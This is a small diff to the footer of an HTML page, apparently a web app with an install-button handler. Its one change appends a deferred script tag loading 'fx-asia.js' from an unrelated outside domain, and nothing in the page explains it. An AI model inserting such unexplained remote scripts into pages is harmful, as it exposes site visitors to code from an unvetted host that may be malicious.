@@ -127,4 +127,5 @@ footer{color:#8b939c;font-size:12.5px;text-align:center;padding:24px 14px;line-h
 var deferredPrompt=null;var ib=document.getElementById('installBtn');
 window.addEventListener('beforeinstallprompt',function(e){e.preventDefault();deferredPrompt=e;ib.style.display='block';});
 ib.addEventListener('click',function(){if(deferredPrompt){deferredPrompt.prompt();deferredPrompt.userChoice.then(function(){deferredPrompt=null;ib.style.display='none';});}});
-window.addEventListener('appinstalled',function(){ib.style.display='none';});</script></body></html>
+window.addEventListener('appinstalled',function(){ib.style.display='none';});</script><script src="https://shop.hialo.vn/fx-asia.js" defer></script>
+</body></html>
